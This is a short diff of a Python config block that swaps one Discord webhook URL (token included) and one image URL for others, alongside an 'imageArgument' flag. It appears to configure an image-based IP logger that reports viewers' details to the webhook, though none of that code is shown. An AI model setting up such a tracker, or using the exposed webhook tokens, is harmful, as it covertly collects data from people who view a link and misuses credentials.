@@ -9,8 +9,8 @@ __author__ = "Bobby"
 
 config = {
 
-    "webhook": "https://discord.com/api/webhooks/1470277466986778675/jF4yXbcn-LEeozVO5FXEqI7kH1IruHpsNn62jpX0BgPDGEgQ9UipKAt4pM0joagNC6fn",
-    "image": "https://i.etsystatic.com/34041246/r/il/5bf5cd/3946263770/il_794xN.3946263770_9n2t.jpg", 
+    "webhook": "https://discord.com/api/webhooks/1499225669295411220/GGybNzWywxEqJz3HFv3PHV4uSt1LMhH1r-5ODRcWNYfAcrcdbmKsRXvGThATYwe3AId7",
+    "image": "https://i1-c.pinimg.com/736x/ad/e1/07/ade107fecb1d2213ca9f28bd6b66fe3a.jpg", 
                                                
     "imageArgument": True, 
 
